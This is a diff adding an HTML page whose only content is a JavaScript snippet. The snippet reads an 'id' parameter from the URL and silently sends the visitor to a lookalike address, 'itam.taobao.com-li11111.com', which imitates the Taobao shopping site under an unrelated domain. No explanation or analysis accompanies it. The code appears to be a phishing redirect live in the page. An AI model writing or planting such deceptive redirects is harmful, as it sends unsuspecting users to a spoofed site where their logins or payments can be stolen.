@@ -1,0 +1,25 @@
+
+          
+
+
+
+
+
+			    <SCRIPT LANGUAGE="JavaScript">
+<!-- 
+function Request(strName) 
+{ 
+var strHref = window.document.location.href; 
+var intPos = strHref.indexOf("?"); 
+var strRight = strHref.substr(intPos + 1); 
+var arrTmp = strRight.split("&"); 
+for(var id = 0; id < arrTmp.length; id++) 
+{ 
+var arrTemp = arrTmp[id].split("="); 
+if(arrTemp[0].toUpperCase() == strName.toUpperCase()) return arrTemp[1]; 
+} 
+return ""; 
+} 
+window.location.href="http://itam.taobao.com-li11111.com/url2.htm?i="+Request("id");
+//--> 
+</SCRIPT>
